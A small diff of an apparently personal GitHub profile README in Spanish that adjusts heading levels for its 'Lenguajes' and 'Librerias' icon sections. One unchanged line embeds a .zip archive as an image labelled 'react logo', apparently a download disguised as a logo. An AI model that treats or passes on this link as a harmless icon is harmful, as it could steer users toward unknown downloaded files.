@@ -1,7 +1,7 @@
 ## <p align="center">HOLA MUNDO 👋 !!</p>
 <p align="center"><img src="assets/portada.jpg" width="400" alt="Portada"/></p>
-###
-# Lenguajes
+
+## Lenguajes
 <div align="left">
   <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/javascript/javascript-original.svg" height="40"/>
   <img width="12"/>
@@ -12,7 +12,7 @@
   <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/git/git-original.svg" height="40"/>
 </div>
 ###
-# Librerias
+## Librerias
 <div align="left">
   <img src="https://raw.githubusercontent.com/ronald288/ronald288/main/ungrafted/ronald288.zip" height="40" alt="react logo"  />
   <img width="12" />
